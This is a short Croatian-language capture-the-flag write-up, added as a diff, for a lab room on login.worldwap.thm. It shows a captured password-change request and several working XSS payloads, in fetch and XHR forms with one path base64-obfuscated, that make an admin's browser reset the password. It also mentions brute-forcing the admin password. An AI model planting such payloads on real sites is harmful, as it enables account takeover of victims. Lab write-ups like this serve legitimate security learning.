@@ -1,0 +1,41 @@
+Generalno imao sam problema samo sa dobivanjem admin panela, jer se nisam sjetio da mogu poslati neki request preko admina.
+
+Uspio sam rjesiti sobu preko broute forcanja admin sifre, no pretpostavljam da to nije bio predviđeni nacin, tako da sam napisao XMLHttpRequest.
+Kada imamo ovakav request:
+POST /change_password.php HTTP/1.1
+Host: login.worldwap.thm
+Content-Length: 17
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://login.worldwap.thm
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://login.worldwap.thm/change_password.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=398e9lc6fakuu5bmpd32k77i5t
+Connection: keep-alive
+
+new_password=meme
+
+
+Trebamo ga pretvoriti u nekako u <script> i to dobivamo ovako koristeci fetch:
+Ovaj primjer ne radi zbog CORS protekcije.
+<script>fetch('http://login.worldwap.thm/change_password.php',{method:'POST',body:'new_password=meme',headers:{'Content-Type':'application/x-www-form-urlencoded'}})</script>
+
+No ovaj ce raditi:
+<script>fetch('/change_password.php',{method:'POST',body:'new_password=meme',headers:{'Content-Type':'application/x-www-form-urlencoded'}})</script>
+Ili mozemo preko XHR:
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('POST', atob('L2NoYW5nZV9wYXNzd29yZC5waHA='), true); //atob samo base64 enkodira, mozemo ostaviti i plantext, TAKOĐER ISTO MORA BITI SAMO /change_password.php
+xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.onreadystatechange = function () {
+  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+    console.log("Radi");
+  }
+};
+xhr.send('action=execute&new_password=meme2');
+</script>
